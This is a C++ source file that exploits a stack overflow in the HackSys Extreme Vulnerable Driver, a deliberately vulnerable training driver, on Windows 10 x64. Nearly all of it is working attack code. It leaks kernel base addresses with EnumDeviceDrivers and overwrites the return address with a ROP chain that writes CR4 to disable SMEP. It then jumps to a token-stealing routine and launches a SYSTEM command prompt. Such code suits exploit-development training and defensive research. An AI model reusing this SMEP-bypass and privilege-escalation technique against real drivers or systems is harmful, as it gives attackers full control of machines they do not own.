#include <stdio.h>
#include <windows.h>
#include <ShlObj.h>
#include<Psapi.h>

// Windows 10 x64 RS4


#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

#define RIP_OFFSET		  0x808	

extern "C" VOID GetToken();

HANDLE open_device()
{
	printf("\n[?] Trying to get handle to device\n");

	LPCSTR lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver";
	DWORD dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;
	DWORD dwShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
	DWORD dwCreationDisposition = OPEN_EXISTING;
	DWORD dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;
	HANDLE hTemplateFile = NULL;

	HANDLE hDevice = CreateFileA(lpFileName,
		dwDesiredAccess,
		dwShareMode,
		lpSecurityAttributes,
		dwCreationDisposition,
		dwFlagsAndAttributes,
		hTemplateFile
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("\t[-] Failed to get Handle to device!\n");
		system("pause");
		exit(0);
	}

	printf("\t[+] Got handle to device: 0x%X\n\n", hDevice);
	return hDevice;
}


void Send_IOCTL(HANDLE device)
{

	printf("[?] Sending IOCTL \n");

	DWORD userModeBufferSize = RIP_OFFSET + 0x8 + 0x18;																		
	BYTE* userModeBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, userModeBufferSize);		

	if (!userModeBuffer) {
		printf("\n\t[-] Failed To Allocate userModeBuffer Memory: 0x%X\n", GetLastError());
		exit(0);
	}
	else {
		printf("\t[+] userModeBuffer Memory Allocated: 0x%p\n", userModeBuffer);
		printf("\t[+] userModeBuffer Allocation Size: 0x%X\n", userModeBufferSize);
	}

	LPVOID addresses[1000];
	DWORD needed;

	EnumDeviceDrivers(addresses, 1000, &needed);
	LPVOID ntoskrnl_addr = addresses[0];
	LPVOID MOV_CR4_RCX_ADDR = LPVOID((INT_PTR)addresses[0] + 0x00490913);
	LPVOID POP_RCX = LPVOID((INT_PTR)addresses[0] + 0x00193ab0);

	printf("\n\t[+] Address of MOV cr4,rcx : 0x%p", MOV_CR4_RCX_ADDR);
	printf("\n\t[+] Address of POP RCX : 0x%p\n", POP_RCX);


	RtlFillMemory(userModeBuffer, userModeBufferSize, 0x41);

	INT_PTR Ret_Address = (INT_PTR)(userModeBuffer + RIP_OFFSET);
	// SMEP BYPASS ROP CHAIN
	*(INT_PTR*)Ret_Address = (INT_PTR)POP_RCX;
	*(INT_PTR*)(Ret_Address + 8 * 1) = (INT_PTR)0x70678;
	*(INT_PTR*)(Ret_Address + 8 * 2) = (INT_PTR)MOV_CR4_RCX_ADDR;

	*(INT_PTR*)(Ret_Address + 8 * 3) = (INT_PTR)& GetToken;



	printf("\n\t[+] RIP Overwritten with Shellcode Address: 0x%p\n", (INT_PTR)& GetToken);
	printf("\t[+] RIP in userModeBuffer at: 0x%p\n", Ret_Address);



	DWORD size_returned = 0;

	DWORD dwIoControlCode = HACKSYS_EVD_IOCTL_STACK_OVERFLOW;
	LPVOID lpOutBuffer = NULL;
	DWORD nOutBufferSize = NULL;
	LPDWORD lpBytesReturned = &size_returned;
	LPOVERLAPPED lpOverlapped = NULL;

	printf("\n[?] Sending IOCTL ..... \n\n");
	BOOL sent_ioctl = DeviceIoControl(
		device,
		dwIoControlCode,
		userModeBuffer,
		userModeBufferSize,
		lpOutBuffer,
		nOutBufferSize,
		lpBytesReturned,
		lpOverlapped
	);

	if (sent_ioctl == 0)
	{
		printf("[-] Error Sending IOCTL\n");
		exit(0);
	}

	HeapFree(GetProcessHeap(), 0, (LPVOID)userModeBuffer);
	printf("\t[+] IOCTL Sent\n\n");

	if (!IsUserAnAdmin())
	{
		printf("\t\t[-] Priv Escalation Failed to get NT SYSTEM\n\n");
	}
	else
	{
		printf("\t\t[+][+] HooraaaaaY Got SYSTEM prompt\n\n");
		system("cmd");
	}

}


int main()
{
	HANDLE device = open_device();

	Send_IOCTL(device);

	printf("\n\nReached End of Program\n");

	return 0;
}